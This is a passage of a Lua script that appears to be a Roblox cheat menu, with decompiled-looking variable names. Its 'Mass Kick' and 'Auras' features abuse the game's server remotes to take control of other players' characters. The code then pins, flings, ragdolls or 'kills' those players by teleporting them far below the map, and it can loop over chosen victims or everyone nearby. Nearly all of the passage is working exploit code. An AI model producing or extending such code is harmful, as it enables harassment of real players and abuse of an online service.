				kickHoldAP.Responsiveness = 1
				local kickHoldAtt1Mass = workspace.Terrain:FindFirstChild("KickHoldAtt1_Mass")

				if kickHoldAtt1Mass then
					kickHoldAtt1Mass.WorldPosition = position
				end

				local kickHoldBV = parent:FindFirstChild("KickHoldBV")

				if not kickHoldBV then
					kickHoldBV = Instance.new("BodyVelocity")
					kickHoldBV.Name = "KickHoldBV"
					kickHoldBV.MaxForce = v33(math.huge, math.huge, math.huge)
					kickHoldBV.Parent = parent
				end

				kickHoldBV.Velocity = (position - parent.Position) * 100
			end

			local function fn26()
				if v27 then
					tcancel(v27)
					v27 = nil
				end

				v27 = tspawn(function()
					while not flag11 do
						local flag13 = false

						for i = 1, 5 do
							local v28 = tbl11[i]

							if v28 and v28.Parent and v28.Character then
								local humanoidRootPart = v28.Character:FindFirstChild("HumanoidRootPart")

								if humanoidRootPart then
									flag13 = true

									if destroyLine2 then
										pcall(function()
											destroyLine2:FireServer(humanoidRootPart)
										end)

										flag13 = true
									end
								end
							end
						end

						if flag13 then
							twait(0.3)
							continue
						end
						break
					end

					v27 = nil
				end)
			end

			local function fn27()
				flag11 = false
				tbl12 = {}

				for _, v28 in ipairs(tbl14) do
					if v28 then
						tcancel(v28)
					end
				end

				tbl14 = {}
				local kickHoldAtt1Mass = workspace.Terrain:FindFirstChild("KickHoldAtt1_Mass")

				if kickHoldAtt1Mass then
					kickHoldAtt1Mass:Destroy()
				end

				for _, player in pairs(ps2:GetPlayers()) do
					local character = player.Character

					if character then
						for _, descendant in ipairs(character:GetDescendants()) do
							if descendant.Name:find("KickHold") or descendant.Name:find("PartOwner") then
								descendant:Destroy()
							end
						end

						for _, v28 in ipairs({
							"Head",
							"Torso",
							"UpperTorso",
							"LowerTorso",
							"HumanoidRootPart",
							"Left Arm",
							"Right Arm",
							"Left Leg",
							"Right Leg",
						}) do
							local v29 = character:FindFirstChild(v28)

							if v29 then
								v29.CanCollide = true
								v29.CanTouch = true
								v29.Velocity = v33(0, 0, 0)
								v29.AssemblyLinearVelocity = v33(0, 0, 0)
							end
						end
					end
				end

				fn26()
			end

			local function fn28()
				local tbl15 = {}

				for _, player in pairs(ps2:GetPlayers()) do
					if player ~= lp2 then
						table.insert(tbl15, player.DisplayName .. " | " .. player.Name)
					end
				end

				table.sort(tbl15)
				table.insert(tbl15, 1, "None")
				return tbl15
			end

			local function fn29()
				local v28 = fn28()

				for i = 1, 5 do
					if tbl13[i] then
						tbl13[i]:Refresh(v28)
					end
				end
			end

			local function fn30(arg, arg2)
				if not arg2 or arg2 == "" or arg2 == "None" then
					local v28 = tbl11[arg]

					if v28 then
						tbl12[v28] = nil
					end

					tbl11[arg] = nil
					return
				end

				local v28 = ps2:FindFirstChild(arg2:match("%|%s(.+)$") or arg2)

				if not v28 then
					local v29 = tbl11[arg]

					if v29 then
						tbl12[v29] = nil
					end

					tbl11[arg] = nil
					return
				end

				for i = 1, 5 do
					if i ~= arg and tbl11[i] == v28 then
						if notify then
							notify("Mass Kick", "Player already selected!", 2)
						end

						tbl11[arg] = nil

						task.defer(function()
							if tbl13[arg] then
								tbl13[arg]:SetValue("None")
							end
						end)

						return
					end
				end

				local v29 = tbl11[arg]

				if v29 then
					tbl12[v29] = nil
				end

				tbl11[arg] = v28
				tbl12[v28] = nil
			end

			for i = 1, 5 do
				tbl13[i] = v26:CreateDropdown({
					Name = "Select Player " .. i,
					Items = fn28(),
					Default = "None",
					Callback = function(arg)
						fn30(i, arg)
					end,
				})
			end

			ps2.PlayerAdded:Connect(fn29)

			ps2.PlayerRemoving:Connect(function(player)
				for i = 1, 5 do
					if tbl11[i] == player then
						tbl11[i] = nil
						tbl12[player] = nil

						if tbl13[i] then
							tbl13[i]:SetValue("None")
						end
					end
				end

				fn29()
			end)

			v26:CreateToggle({
				Name = "Auto Delete Player",
				Default = false,
				Callback = function(arg)
					flag12 = arg

					if not arg then
						tbl12 = {}
					end
				end,
			})

			v26:CreateToggle({
				Name = "Start kick",
				Default = false,
				Callback = function(arg)
					if arg then
						if v27 then
							tcancel(v27)
							v27 = nil
						end

						fn27()
						flag11 = true

						local v28 = tspawn(function()
							while flag11 do
								local character = lp2.Character
								local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")

								if not humanoidRootPart then
									twait(0.1)
								else
									local position = humanoidRootPart.Position
									local lookVector = humanoidRootPart.CFrame.LookVector
									local tbl15 = {}
									local n30 = 0

									for i = 1, 5 do
										if tbl11[i] then
											n30 += 1
											tbl15[i] = n30
										end
									end

									for i = 1, 5 do
										if flag11 then
											local v28 = tbl11[i]

											if v28 and v28.Parent and v28.Character then
												if not (flag12 and tbl12[v28]) then
													local character2 = v28.Character
													local humanoid = character2:FindFirstChild("Humanoid")
													local humanoidRootPart2 = character2:FindFirstChild("HumanoidRootPart")

													if humanoid and humanoid.Health > 0 and humanoidRootPart2 then
														fn24(character2, true)
														fn23(character2)
														local n31

														if n30 == 1 then
															n31 = position + v33(0, 10, 0)
														else
															local n32 = ((tbl15[i] or 1) - 1) * 6.2831853071795862 / n30
															n31 = position + v33(math.cos(n32) * n27, 10, math.sin(n32) * n27)
														end

														if (humanoidRootPart2.Position - position).Magnitude > 30 and not fn22(v28) then
															local cFrame = humanoidRootPart.CFrame
															local n32 = tick() + 2.5

															while flag11 and not fn22(v28) and tick() < n32 do
																local character3 = lp2.Character
																character3 = character3 and character3:FindFirstChild("HumanoidRootPart")

																if character3 and humanoidRootPart2 then
																	character3.CFrame = humanoidRootPart2.CFrame * cf2(0, -10, 0)
																	fn21(character3)

																	if createLine then
																		pcall(function()
																			createLine:FireServer(humanoidRootPart2)
																		end)
																	end

																	if sno2 then
																		pcall(function()
																			sno2:FireServer(humanoidRootPart2, humanoidRootPart2.CFrame)
																		end)
																	end
																end

																twait()
															end

															local character3 = lp2.Character
															humanoidRootPart = character3 and character3:FindFirstChild("HumanoidRootPart")

															if humanoidRootPart and cFrame then
																humanoidRootPart.CFrame = cFrame
																fn21(humanoidRootPart)
															end

															if not fn22(v28) then
																if flag12 then
																	tbl12[v28] = true

																	if notify then
																		notify("Mass Kick", "Пропущен " .. v28.DisplayName .. " (>2.5 сек)", 2)
																	end
																else
																	fn25(humanoidRootPart2, n31, lookVector)
																end

																continue
															end
														elseif not fn22(v28) then
															if createLine then
																pcall(function()
																	createLine:FireServer(humanoidRootPart2)
																end)
															end

															if sno2 then
																pcall(function()
																	sno2:FireServer(humanoidRootPart2, humanoidRootPart2.CFrame)
																end)
															end
														end

														fn25(humanoidRootPart2, n31, lookVector)
														continue
													end
												end
											end

											continue
										end

										break
									end

									twait()
								end
							end
						end)

						table.insert(tbl14, v28)

						for i = 1, 5 do
							local v29 = tspawn(function()
								while flag11 do
									local v29 = tbl11[i]

									if v29 and v29.Parent and v29.Character then
										if not (flag12 and tbl12[v29]) then
											local humanoidRootPart = v29.Character:FindFirstChild("HumanoidRootPart")

											if humanoidRootPart and sno2 then
												pcall(function()
													sno2:FireServer(humanoidRootPart, humanoidRootPart.CFrame)
												end)
											end
										end
									end

									if n28 > 0 then
										twait(n28)
									else
										twait()
									end
								end
							end)

							table.insert(tbl14, v29)

							local v30 = tspawn(function()
								while flag11 do
									local v30 = tbl11[i]

									if v30 and v30.Parent and v30.Character then
										if not (flag12 and tbl12[v30]) then
											local character = lp2.Character
											local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
											local humanoidRootPart2 = v30.Character:FindFirstChild("HumanoidRootPart")

											if humanoidRootPart and humanoidRootPart2 and (humanoidRootPart2.Position - humanoidRootPart.Position).Magnitude < 30 then
												if destroyLine2 then
													pcall(function()
														destroyLine2:FireServer(humanoidRootPart2)
													end)
												end
											end
										end
									end

									if n29 > 0 then
										twait(n29)
									else
										twait()
									end
								end
							end)

							table.insert(tbl14, v30)
						end
					else
						fn27()
					end
				end,
			})

			v26:CreateSlider({
				Name = "SNO Delay",
				Min = 0,
				Max = 0.015,
				Default = 0.015,
				DecimalPlaces = 3,
				Callback = function(arg)
					n28 = arg
				end,
			})

			v26:CreateSlider({
				Name = "DestroyLine Delay",
				Min = 0,
				Max = 0.02,
				Default = 0.2,
				DecimalPlaces = 3,
				Callback = function(arg)
					n29 = arg
				end,
			})
		end
	end

	_G.TargetAurasBlock = _G.MiscTab:CreateBlock({ Name = "Auras", Side = "Right", ImageID = "13285615740" })
	local targetAurasBlock
	targetAurasBlock = _G.TargetAurasBlock
	local ws2, lp2, ps2, sno2, destroyLine2, permanentPallet2, cf2, v33, notify, playSound
	local sounds, tspawn, tcancel, twait, v18, targetAuras
	local states = _G.States
	ws2 = _G.WS
	lp2 = _G.LP
	ps2 = _G.PS or game:GetService("Players")
	sno2 = _G.SNO
	destroyLine2 = _G.DestroyLine
	permanentPallet2 = _G.PermanentPallet or _G.States.PermanentPallet
	cf2 = _G.CF
	v33 = _G.V3

	notify = _G.Notify or function()
	end

	playSound = _G.PlaySound or function()
	end

	sounds = _G.Sounds or {}
	tspawn = _G.tspawn or task.spawn
	tcancel = _G.tcancel or task.cancel
	twait = _G.twait or task.wait
	v18 = pcall

	states.TargetAuras = states.TargetAuras or {
		selectedAura = "Ragdoll",
		enabled = false,
		ragdollThread = nil,
		launchThread = nil,
		kickThread = nil,
		lockThread = nil,
		currentThread = nil,
	}

	targetAuras = states.TargetAuras
	local fn15

	do
		local function fn16(arg)
			local character = arg.Character
			if not character then
				return nil, nil
			end
			local humanoidRootPart = character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")
			return humanoidRootPart, character:FindFirstChild("Head") or humanoidRootPart
		end

		local function fn17(arg)
			if not arg then
				return false
			end
			local partOwner = arg:FindFirstChild("PartOwner")
			return partOwner and partOwner.Value == lp2.Name
		end

		local function fn18(arg)
			if not sno2 or not arg then
				return
			end

			v18(function()
				sno2:FireServer(arg, arg.CFrame)
			end)
		end

		local function fn19(arg)
			local character = arg.Character
			if not character then
				return nil
			end
			local head = character:FindFirstChild("Head")
			if head and fn17(head) then
				return character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")
			end
			return nil
		end

		local function fn20(parent, position)
			if not parent or not parent.Parent then
				return
			end
			local parent2 = parent.Parent
			parent2 = parent2 and parent2:FindFirstChildOfClass("Humanoid")

			if parent2 then
				parent2.PlatformStand = true
				parent2.Sit = false
			end

			local cframe = CFrame.lookAt(position, position + v33(1, 0, 0))

			v18(function()
				parent.CFrame = cframe
				parent.AssemblyLinearVelocity = v33(0, 0, 0)
				parent.Velocity = v33(0, 0, 0)
			end)

			local kickBodyPosition = parent:FindFirstChild("KickBodyPosition")

			if not kickBodyPosition then
				local bodyPosition = Instance.new("BodyPosition")
				bodyPosition.Name = "KickBodyPosition"
				bodyPosition.MaxForce = v33(math.huge, math.huge, math.huge)
				bodyPosition.P = 50000
				bodyPosition.D = 100
				bodyPosition.Parent = parent
				kickBodyPosition = bodyPosition
			end

			kickBodyPosition.Position = position
			local kickBodyGyro = parent:FindFirstChild("KickBodyGyro")

			if not kickBodyGyro then
				kickBodyGyro = Instance.new("BodyGyro")
				kickBodyGyro.Name = "KickBodyGyro"
				kickBodyGyro.MaxTorque = v33(math.huge, math.huge, math.huge)
				kickBodyGyro.P = 50000
				kickBodyGyro.D = 100
				kickBodyGyro.Parent = parent
			end

			kickBodyGyro.CFrame = cframe
		end

		fn15 = function(arg, arg2)
			if not arg or not arg.Character then
				return false
			end
			local v19 = fn19(arg)
			if v19 then
				fn20(v19, arg2)
				return true
			end
			local v20, v21 = fn16(arg)

			if v20 and v21 then
				fn18(v21)
				task.wait(0.05)
				local v22 = fn19(arg)
				if v22 then
					fn20(v22, arg2)
					return true
				end
			end

			return false
		end
	end

	local fn16

	fn16 = function()
		if targetAuras.ragdollThread then
			tcancel(targetAuras.ragdollThread)
			targetAuras.ragdollThread = nil
		end

		if targetAuras.launchThread then
			tcancel(targetAuras.launchThread)
			targetAuras.launchThread = nil
		end

		if targetAuras.kickThread then
			tcancel(targetAuras.kickThread)
			targetAuras.kickThread = nil
		end

		if targetAuras.lockThread then
			tcancel(targetAuras.lockThread)
			targetAuras.lockThread = nil
		end

		for _, player in pairs(ps2:GetPlayers()) do
			if player ~= lp2 then
				local character = player.Character

				if character then
					local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

					if humanoidRootPart then
						local kickBodyPosition = humanoidRootPart:FindFirstChild("KickBodyPosition")

						if kickBodyPosition then
							kickBodyPosition:Destroy()
						end

						local kickBodyGyro = humanoidRootPart:FindFirstChild("KickBodyGyro")

						if kickBodyGyro then
							kickBodyGyro:Destroy()
						end

						local antiGravityForce = humanoidRootPart:FindFirstChild("antiGravityForce")

						if antiGravityForce then
							antiGravityForce:Destroy()
						end
					end
				end
			end
		end

		if permanentPallet2.enabled and permanentPallet2.currentPallet and permanentPallet2.currentPallet.Parent then
			local soundPart = permanentPallet2.currentPallet:FindFirstChild("SoundPart")

			if soundPart then
				v18(function()
					soundPart.CFrame = CFrame.new(0, 1e9, 0)
				end)
			end
		end
	end

	do
		local n25 = 29

		local tbl10 = {
			"Head",
			"HumanoidRootPart",
			"Torso",
			"UpperTorso",
			"LowerTorso",
			"Left Arm",
			"Right Arm",
			"Left Leg",
			"Right Leg",
		}

		local tbl11 = {}
		local v19 = nil

		local function fn17(arg)
			if arg then
				arg.Velocity = v33(0, 0, 0)
				arg.AssemblyLinearVelocity = v33(0, 0, 0)
				arg.RotVelocity = v33(0, 0, 0)
				arg.AssemblyAngularVelocity = v33(0, 0, 0)
			end
		end

		local function fn18(arg)
			if not arg then
				return false
			end

			for _, descendant in ipairs(arg:GetDescendants()) do
				if descendant.Name == "PartOwner" and descendant:IsA("StringValue") and descendant.Value == lp2.Name then
					return true
				end
			end

			return false
		end

		local function fn19(arg, arg2)
			if not arg then
				return
			end

			for _, v20 in ipairs(tbl10) do
				local v21 = arg:FindFirstChild(v20)

				if v21 then
					if arg2 then
						fn17(v21)
						v21.CanCollide = false
						v21.CanTouch = false
					else
						v21.CanCollide = true
						v21.CanTouch = true
					end
				end
			end
		end

		local function fn20()
			for k in pairs(tbl11) do
				v18(function()
					if k and k.Parent then
						fn19(k, false)
					end
				end)

				tbl11[k] = nil
			end
		end

		local function fn21()
			if v19 then
				tcancel(v19)
				v19 = nil
			end

			fn20()
		end

		local function fn22()
			if v19 then
				tcancel(v19)
				v19 = nil
			end

			v19 = tspawn(function()
				while targetAuras.enabled and targetAuras.selectedAura ~= "Ragdoll" do
					local character = lp2.Character
					character = character and character:FindFirstChild("HumanoidRootPart")
					local tbl12 = {}

					if character then
						local position = character.Position

						for _, player in pairs(ps2:GetPlayers()) do
							if player ~= lp2 and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
								local character2 = player.Character

								if (character2.HumanoidRootPart.Position - position).Magnitude <= n25 then
									tbl12[character2] = true

									if not tbl11[character2] then
										tbl11[character2] = true
										fn19(character2, true)
									end
								end
							end
						end
					end

					for k in pairs(tbl11) do
						if k and k.Parent and tbl12[k] then
							if fn18(k) then
								for _, v20 in ipairs({
									"Head",
									"HumanoidRootPart",
									"Torso",
									"Left Arm",
									"Right Arm",
									"Left Leg",
									"Right Leg",
								}) do
									local v21 = k:FindFirstChild(v20)

									if v21 then
										v18(function()
											fn17(v21)
										end)
									end
								end
							end
						else
							v18(function()
								fn19(k, false)
							end)

							tbl11[k] = nil
						end
					end

					twait()
				end
			end)
		end

		local function fn23(arg, cFrame, arg2, arg3)
			if not arg or not arg2 or not arg3 then
				return
			end

			spawn(function()
				v18(function()
					sno2:FireServer(arg2, arg2.CFrame)

					if arg3:FindFirstChild("Ragdolled") and arg3.Ragdolled.Value == false then
						arg.CFrame = arg2.CFrame * cf2(0, 2, 0)
						twait(0.05)
						arg.CFrame = cFrame
						arg3:ChangeState(Enum.HumanoidStateType.Physics)
					end
				end)
			end)
		end

		local function fn24()
			if not permanentPallet2.enabled or not permanentPallet2.currentPallet then
				notify("Ragdoll Aura", "Permanent Pallet not enabled!", 3)
				return false
			end
			local soundPart = permanentPallet2.currentPallet:FindFirstChild("SoundPart")
			if not soundPart then
				notify("Ragdoll Aura", "Pallet has no SoundPart!", 3)
				return false
			end
			local cFrame = soundPart.CFrame

			targetAuras.ragdollThread = tspawn(function()
				while targetAuras.enabled and targetAuras.selectedAura == "Ragdoll" do
					local character = lp2.Character

					if character and character:FindFirstChild("HumanoidRootPart") then
						local position = character.HumanoidRootPart.Position
						local tbl12 = {}
						local n26 = 0

						for _, player in pairs(ps2:GetPlayers()) do
							if player ~= lp2 and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
								local character2 = player.Character
								local humanoidRootPart = character2.HumanoidRootPart
								local humanoid = character2:FindFirstChild("Humanoid")

								if humanoid and humanoid.Health > 0 then
									if (humanoidRootPart.Position - position).Magnitude <= 30 then
										n26 += 1
										table.insert(tbl12, { hrp = humanoidRootPart, hum = humanoid })
									end
								end
							end
						end

						if n26 > 0 then
							local n27

							if n26 == 1 then
								n27 = 0
							elseif n26 >= 24 then
								n27 = 1
							else
								n27 = (n26 - 1) / 23
							end

							for _, v20 in pairs(tbl12) do
								spawn(function()
									sno2:FireServer(v20.hrp, v20.hrp.CFrame)

									if v20.hum:FindFirstChild("Ragdolled") and v20.hum.Ragdolled.Value == false then
										soundPart.CFrame = v20.hrp.CFrame * cf2(0, 2, 0)
										twait(0.05)
										soundPart.CFrame = cFrame
										v20.hum:ChangeState(Enum.HumanoidStateType.Physics)
									end
								end)

								if n27 > 0 then
									twait(n27)
								end
							end
						end
					end

					twait()
				end
			end)

			return true
		end

		local function fn25()
			targetAuras.launchThread = tspawn(function()
				ws2.FallenPartsDestroyHeight = -10000
				local tbl12 = {}

				while targetAuras.enabled and targetAuras.selectedAura == "Kill" do
					local character = lp2.Character

					if character and character:FindFirstChild("HumanoidRootPart") then
						local position = character.HumanoidRootPart.Position

						for _, player in pairs(ps2:GetPlayers()) do
							if player ~= lp2 and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
								local character2 = player.Character
								local humanoidRootPart = character2:FindFirstChild("HumanoidRootPart")
								local head = character2:FindFirstChild("Head")
								local torso = character2:FindFirstChild("Torso") or character2:FindFirstChild("UpperTorso")
								local humanoid = character2:FindFirstChild("Humanoid")

								if humanoidRootPart and humanoid and humanoid.Health > 0 then
									local magnitude = (humanoidRootPart.Position - position).Magnitude
									local partOwner = nil

									if head then
										partOwner = head:FindFirstChild("PartOwner")
									end

									if (not partOwner or partOwner.Value ~= lp2.Name) and torso then
										partOwner = torso:FindFirstChild("PartOwner")
									end

									partOwner = partOwner and partOwner.Value == lp2.Name

									if magnitude <= 38 then
										if partOwner then
											if not tbl12[player] then
												v18(function()
													sno2:FireServer(humanoidRootPart, humanoidRootPart.CFrame)
													local vector = Vector3.new(humanoidRootPart.Position.X, -10000, humanoidRootPart.Position.Z)
													humanoidRootPart.CFrame = CFrame.new(vector)
													humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
													humanoidRootPart.Velocity = Vector3.zero

													for _, v20 in ipairs({ "Head", "Torso", "Left Arm", "Right Arm", "Left Leg", "Right Leg", "UpperTorso", "LowerTorso" }) do
														local v21 = character2:FindFirstChild(v20)

														if v21 then
															v21.CFrame = CFrame.new(Vector3.new(v21.Position.X, -10000, v21.Position.Z))
															v21.AssemblyLinearVelocity = Vector3.zero
															v21.Velocity = Vector3.zero
														end
													end

													tbl12[player] = true
												end)
											end
										else
											spawn(function()
												sno2:FireServer(humanoidRootPart, humanoidRootPart.CFrame)
											end)

											if tbl12[player] then
												tbl12[player] = nil
											end
										end
									elseif tbl12[player] then
										tbl12[player] = nil
									end
								end
							end
						end
					end

					twait()
				end

				v18(function()
					ws2.FallenPartsDestroyHeight = 0
				end)
			end)

			return true
		end

		local n26 = 24
		local n27 = 1
		local n28 = 15
		local n29 = 15
		local n30 = 30

		local function fn26(arg, arg2)
			local tbl12 = {}

			for i = 1, arg do
				local v20 = math.rad((i - 1) * 360 / arg)
				local n31 = arg2.Y + n29
				local z = arg2.Z
				tbl12[i] = Vector3.new(arg2.X + math.cos(v20) * n28, n31, z + math.sin(v20) * n28)
			end

			return tbl12
		end

		local function fn27()
			local soundPart

			if permanentPallet2.enabled and permanentPallet2.currentPallet then
				soundPart = permanentPallet2.currentPallet:FindFirstChild("SoundPart")
			end

			local cFrame = soundPart and soundPart.CFrame

			targetAuras.kickThread = tspawn(function()
				local tbl12 = {}

				while targetAuras.enabled and targetAuras.selectedAura == "Kick" do
					local character = lp2.Character

					if character and character:FindFirstChild("HumanoidRootPart") then
						local position = character.HumanoidRootPart.Position
						local tbl13 = {}

						for _, player in pairs(ps2:GetPlayers()) do
							if player ~= lp2 and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
								local character2 = player.Character
								local humanoidRootPart = character2.HumanoidRootPart
								local humanoid = character2:FindFirstChild("Humanoid")

								if humanoidRootPart and humanoid and humanoid.Health > 0 then
									if (humanoidRootPart.Position - position).Magnitude <= n30 then
										table.insert(tbl13, player)
									end
								end
							end
						end

						table.sort(tbl13, function(arg, arg2)
							return arg.UserId < arg2.UserId
						end)

						local n31 = #tbl13

						if n26 < n31 then
							n31 = 24
						end

						for k in pairs(tbl12) do
							local flag7 = false

							for i = 1, n31 do
								if tbl13[i] == k then
									flag7 = true
									break
								end
							end

							if not flag7 then
								local character2 = k.Character

								if character2 then
									local humanoidRootPart = character2:FindFirstChild("HumanoidRootPart")

									if humanoidRootPart then
										local kickBodyPosition = humanoidRootPart:FindFirstChild("KickBodyPosition")

										if kickBodyPosition then
											kickBodyPosition:Destroy()
										end

										local kickBodyGyro = humanoidRootPart:FindFirstChild("KickBodyGyro")

										if kickBodyGyro then
											kickBodyGyro:Destroy()
										end
									end
								end

								tbl12[k] = nil
							end
						end

						if n27 <= n31 then
							local v20 = fn26(n31, position)

							for i = 1, n31 do
								local v21 = tbl13[i]

								if v21 and v21.Character then
									local v22 = v20[i]

									task.spawn(function()
										local humanoidRootPart = v21.Character and v21.Character:FindFirstChild("HumanoidRootPart")

										if humanoidRootPart then
											fn15(v21, v22)
											tbl12[v21] = true

											if soundPart and cFrame then
												local humanoid = v21.Character:FindFirstChild("Humanoid")

												if humanoid and humanoid.Health > 0 then
													fn23(soundPart, cFrame, humanoidRootPart, humanoid)
												end
											end

											sno2:FireServer(humanoidRootPart, humanoidRootPart.CFrame)

											if destroyLine2 then
												destroyLine2:FireServer(v21.Character:FindFirstChild("Head") or humanoidRootPart)
											end
										end
									end)
								end
							end
						end
					end

					twait()
				end
			end)

			return true
		end

		local function fn28()
			local soundPart

			if permanentPallet2.enabled and permanentPallet2.currentPallet then
				soundPart = permanentPallet2.currentPallet:FindFirstChild("SoundPart")
			end

			local cFrame = soundPart and soundPart.CFrame

			targetAuras.lockThread = tspawn(function()
				local tbl12 = {}

				while targetAuras.enabled and targetAuras.selectedAura == "Lock" do
					local character = lp2.Character

					if character and character:FindFirstChild("HumanoidRootPart") then
						local position = character.HumanoidRootPart.Position
						local tbl13 = {}

						for _, player in pairs(ps2:GetPlayers()) do
							if player ~= lp2 and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
								local character2 = player.Character
								local humanoidRootPart = character2.HumanoidRootPart
								local humanoid = character2:FindFirstChild("Humanoid")

								if humanoidRootPart and humanoid and humanoid.Health > 0 then
									if (humanoidRootPart.Position - position).Magnitude <= n30 then
										table.insert(tbl13, player)
									end
								end
							end
						end

						table.sort(tbl13, function(arg, arg2)
							return arg.UserId < arg2.UserId
						end)

						local n31 = #tbl13

						if n26 < n31 then
							n31 = 24
						end

						for k in pairs(tbl12) do
							local flag7 = false

							for i = 1, n31 do
								if tbl13[i] == k then
									flag7 = true
									break
								end
							end

							if not flag7 then
								local character2 = k.Character

								if character2 then
									local humanoidRootPart = character2:FindFirstChild("HumanoidRootPart")

									if humanoidRootPart then
										local kickBodyPosition = humanoidRootPart:FindFirstChild("KickBodyPosition")

										if kickBodyPosition then
											kickBodyPosition:Destroy()
										end

										local kickBodyGyro = humanoidRootPart:FindFirstChild("KickBodyGyro")

										if kickBodyGyro then
											kickBodyGyro:Destroy()
										end
									end
								end

								tbl12[k] = nil
							end
						end

						if n27 <= n31 then
							local v20 = fn26(n31, position)

							for i = 1, n31 do
								local v21 = tbl13[i]

								if v21 and v21.Character then
									local v22 = v20[i]

									task.spawn(function()
										local humanoidRootPart = v21.Character and v21.Character:FindFirstChild("HumanoidRootPart")

										if humanoidRootPart then
											fn15(v21, v22)
											tbl12[v21] = true

											if soundPart and cFrame then
												local humanoid = v21.Character:FindFirstChild("Humanoid")

												if humanoid and humanoid.Health > 0 then
													fn23(soundPart, cFrame, humanoidRootPart, humanoid)
												end
											end

											sno2:FireServer(humanoidRootPart, humanoidRootPart.CFrame)
										end
									end)
								end
							end
						end
					end

					twait()
				end
			end)

			return true
		end

		local function fn29()
			fn16()

			if targetAuras.selectedAura == "Ragdoll" then
				fn24()
			elseif targetAuras.selectedAura == "Kill" then
				fn25()
			elseif targetAuras.selectedAura == "Kick" then
				fn27()
			elseif targetAuras.selectedAura == "Lock" then
				fn28()
			end
		end

		targetAurasBlock:CreateDropdown({
			Name = "Select Aura",
			Items = { "Ragdoll", "Kill", "Kick", "Lock" },
			Default = "Ragdoll",
			Callback = function(selectedAura)
				local flag7 = targetAuras.selectedAura == "Ragdoll"
				targetAuras.selectedAura = selectedAura

				if targetAuras.enabled then
					fn29()

					if selectedAura == "Ragdoll" and not flag7 then
						fn21()
					elseif selectedAura ~= "Ragdoll" and flag7 then
						fn22()
					end
				end
			end,
		})

		targetAurasBlock:CreateToggle({
			Name = "Enable Aura",
			Default = false,
			Callback = function(arg)
				if arg then
					targetAuras.enabled = true
					fn29()

					if targetAuras.selectedAura ~= "Ragdoll" then
						fn22()
					end

					notify("Aura", targetAuras.selectedAura .. " aura enabled", 2)
					playSound(sounds.Notify)
				else
					targetAuras.enabled = false
					fn16()
					fn21()
					notify("Aura", "Disabled", 2)
				end
			end,
		})
	end

	local lp3
	lp3 = _G.LP
	local ws3
	ws3 = _G.WS
	local repS
	repS = _G.RepS
	local cf3
	cf3 = _G.CF
	local v34
	v34 = _G.V3
	local playSound2
	playSound2 = _G.PlaySound
	local sounds2
	sounds2 = _G.Sounds
	local ps3, ge, destroyRemote, v19, serverBanana, tbl10, n25, fn17, fn18, fn19
	local fn20, fn21, fn22, fn23

	do
		local states2 = _G.States
		ps3 = _G.PS
		local he = _G.HE
		ge = _G.GE
		local sno3 = _G.SNO
		destroyRemote = _G.DestroyRemote
		v19 = _G.ServerTab:CreateBlock({ Name = "Loop all server", Side = "Left", ImageID = "484396118" })

		states2.ServerBanana = states2.ServerBanana or {
			enabled = false,
			spawnThread = nil,
			moveThread = nil,
			bananaCount = 1,
			pickIndex = 0,
			slots = {},
		}

		serverBanana = states2.ServerBanana
		tbl10 = {}
		n25 = 0.1

		fn17 = function()
			local Stats2 = game:GetService("Stats")

			if Stats2 and Stats2.Network and Stats2.Network.ServerStatsItem then
				n25 = Stats2.Network.ServerStatsItem["Data Ping"]:GetValue() / 1000
			end
		end

		fn18 = function(arg)
			if he and he:FindFirstChild("Use") then
				pcall(function()
					he.Use:FireServer(arg)
				end)
			end
		end

		fn19 = function()
			local v20 = ws3:FindFirstChild(lp3.Name .. "SpawnedInToys")

			if v20 then
				for _, child in pairs(v20:GetChildren()) do
					if child.Name == "FoodBanana" or child.Name == "BananaPeel" then
						pcall(function()
							if destroyRemote then
								destroyRemote:FireServer(child)
							end
						end)
					end
				end
			end
		end

		fn20 = function(arg)
			if not arg or not arg.Parent then
				return false
			end

			for _, child in pairs(arg:GetChildren()) do
				if child.Name == "EdiblePart" then
					return true
				end
			end

			return false
		end

		fn21 = function(arg)
			if not arg then
				return false
			end

			for _, child in ipairs(arg:GetChildren()) do
				if child:IsA("BasePart") then
					local partOwner = child:FindFirstChild("PartOwner")
					if partOwner and partOwner.Value == lp3.Name then
						return true
					end
				end
			end

			for _, child in ipairs(arg:GetChildren()) do
				if child:IsA("BasePart") then
					local partOwner = child:FindFirstChild("PartOwner")
					if partOwner and partOwner.Value ~= "" and partOwner.Value ~= lp3.Name then
						return false
					end
				end
			end

			return true
		end

		fn22 = function()
			return {
				hasItem = false,
				chainActive = false,
				currentBanana = nil,
				bananaParts = {},
				lastTargetPos = nil,
				lastTargetTime = nil,
				targetVelocity = v34(0, 0, 0),
				lastNetworkUpdate = 0,
				lastOwnershipCheck = 0,
				isTakingOwnership = false,
				originalPos = nil,
				ownershipFailCount = 0,
				currentTarget = nil,
				currentTargetStart = 0,
				holdPosition = v34(0, -7, 20000),
			}
		end

		local function fn24(arg)
			for _, slot in ipairs(serverBanana.slots) do
				if slot.currentBanana == arg then
					return true
				end
			end

			return false
		end

		fn23 = function(arg)
			if arg.currentBanana and arg.currentBanana.Parent then
				pcall(function()
					if destroyRemote then
						destroyRemote:FireServer(arg.currentBanana)
					end
				end)
			end

			arg.currentBanana = nil
			arg.bananaParts = {}
			arg.hasItem = false
		end

		local function fn25(arg, arg2)
			if not arg2 then
				return
			end
			arg.bananaParts = {}

			for _, child in ipairs(arg2:GetChildren()) do
				if child:IsA("BasePart") then
					pcall(function()
						sno3:FireServer(child, child.CFrame)
						child.CanTouch = true
						child.CanCollide = true
						child.Anchored = false
						table.insert(arg.bananaParts, child)
					end)
				end
			end
		end

		local function fn26(arg, currentBanana)
			if not currentBanana or arg.isTakingOwnership then
				return false
			end
			arg.isTakingOwnership = true
			local character = lp3.Character
			if not character then
				arg.isTakingOwnership = false
				return false
			end
			local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
			if not humanoidRootPart then
				arg.isTakingOwnership = false
				return false
			end
